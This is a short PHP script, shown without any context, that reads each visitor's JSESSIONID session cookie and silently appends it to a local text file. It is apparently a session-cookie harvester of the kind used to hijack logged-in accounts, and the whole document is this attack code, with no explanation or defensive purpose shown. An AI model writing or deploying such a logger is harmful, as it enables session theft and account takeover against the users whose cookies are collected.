<?php
$cookie = $_COOKIE['JSESSIONID'];
$file =fopen('coookie.txt', 'a');
fwrite($file, $cookie . "\n\n");
?>
